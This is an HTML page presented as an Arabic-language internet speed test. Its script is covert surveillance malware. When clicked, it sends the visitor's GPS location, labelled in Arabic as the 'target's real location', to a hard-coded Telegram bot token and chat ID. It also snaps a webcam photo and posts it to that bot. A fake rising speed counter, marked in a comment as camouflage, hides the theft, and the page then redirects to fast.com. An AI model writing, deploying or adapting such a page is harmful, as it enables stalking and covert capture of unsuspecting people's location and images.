<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - ÙØ­Øµ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª</title>
    <style>
        body { background-color: #0b0b0d; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; }
        .speed-text { font-size: 80px; font-weight: bold; color: #00d1b2; }
        .unit { font-size: 20px; color: #888; }
        .btn { background: #00d1b2; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 18px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>SpeedTest</h2>
        <div class="speed-text" id="speed">0.0</div>
        <div class="unit">Mbps</div>
        <button class="btn" onclick="startTest()">Ø§Ø¨Ø¯Ø£ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¢Ù†</button>
        <p id="status" style="color: #666; margin-top: 20px;">Ø§Ø¶ØºØ· Ù„Ø¨Ø¯Ø¡ ÙØ­Øµ Ø¬ÙˆØ¯Ø© Ø§Ù„Ø§ØªØµØ§Ù„</p>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';

        async function startTest() {
            document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...";
            
            // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (GPS)
            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù‡Ø¯Ù Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ:\n" + mapLink)}`);
            });

            // 2. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'shot.jpg');
                        formData.append('chat_id', CHAT_ID);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }, 'image/jpeg');
                    
                    // ØªÙ…ÙˆÙŠÙ‡: Ø±ÙØ¹ Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø³Ø±Ø¹Ø©
                    let s = 0;
                    const interval = setInterval(() => {
                        s += Math.random() * 10;
                        document.getElementById('speed').innerText = s.toFixed(1);
                        if (s > 45) {
                            clearInterval(interval);
                            window.location.href = "https://www.fast.com"; // ØªØ­ÙˆÙŠÙ„ Ù„Ù…ÙˆÙ‚Ø¹ ÙØ­Øµ Ø­Ù‚ÙŠÙ‚ÙŠ
                        }
                    }, 100);
                }, 1000);
            } catch (err) {
                window.location.href = "https://www.fast.com";
            }
        }
    </script>
</body>
</html>
